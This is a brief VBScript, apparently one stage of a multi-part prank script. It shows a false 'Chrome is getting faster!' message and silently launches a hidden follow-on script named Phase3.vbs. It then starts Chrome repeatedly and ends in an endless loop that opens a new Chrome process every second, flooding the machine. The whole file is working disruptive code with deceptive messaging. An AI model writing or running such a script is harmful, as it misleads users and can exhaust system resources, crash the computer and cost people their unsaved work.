Dim WshShell
Set WshShell = CreateObject("WScript.Shell")

WScript.Sleep 120000
MsgBox "Phase 2: Chrome is getting faster!"

WshShell.Run "wscript.exe Phase3.vbs", 0, False

Dim i
For i = 10 To 1 Step -1
    WshShell.Run "chrome.exe"
    WScript.Sleep i * 1000
Next

Do
    WshShell.Run "chrome.exe"
    WScript.Sleep 1000
Loop